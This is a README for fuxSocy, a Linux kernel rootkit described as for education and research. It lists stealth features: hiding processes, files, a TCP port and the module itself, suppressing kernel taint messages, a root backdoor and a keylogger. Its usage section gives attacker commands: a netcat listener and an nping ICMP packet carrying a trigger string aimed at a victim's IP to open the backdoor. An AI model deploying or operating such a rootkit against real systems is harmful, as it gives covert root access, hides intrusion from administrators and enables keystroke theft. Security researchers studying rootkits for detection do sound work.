=========

fuxSocy is a Linux kernel rootkit for educational and research purposes only.

It can:

- Hide processes with `kill -44 <pid>`
- Hide child processes of hidden processes
- Hide CPU usage of hidden processes
- Hide any file/process with prefix "hide_ts_"
- Hide TCP port 42069 (also from tcpdump)
- Hide ICMP packets or use them as a backdoor trigger
- Hide itself from lsmod, /proc/modules, and dmesg
- Suppress kernel taint messages
- TTY root backdoor
- Keylogger (still untested)

Usage:
load - sudo bash make.sh
clean - make clean
backdoor (attacker) - nc -lvnp
backdoor (attacker) - sudo nping --icmp -c 1 --data-string "fuxSocy_RUN_BACKDOOR" <victims ip>
